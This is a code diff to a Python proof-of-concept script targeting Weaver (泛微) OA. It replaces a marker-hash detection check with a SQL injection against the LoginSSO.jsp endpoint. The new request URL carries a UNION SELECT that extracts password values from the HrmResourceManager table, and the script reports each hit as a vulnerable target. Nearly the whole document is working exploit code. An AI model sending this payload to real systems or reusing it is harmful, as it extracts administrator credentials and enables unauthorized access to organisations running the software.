@@ -8,10 +8,10 @@ headers = {
 def poc(target):
     try:
         target = get_standard_url(target)
-        url = target + '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+6412121cbb2dc2cb9e460cfee7046be+as+id'
+        url = target + '/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager'
         req = httpx.get(url,headers=headers)
-        if "6412121cbb2dc2cb9e460cfee7046be" in req.text and req.status_code == 200:
-            print("\033[0;31m 泛微OA V8 SQL注入漏洞："+ url )
+        if "<code>" in req.text and "<BODY>" in req.text and req.status_code == 200:
+            print("\033[0;31m 泛微OA LoginSSO.jsp SQL注入漏洞："+ url )
     except:
         pass
 
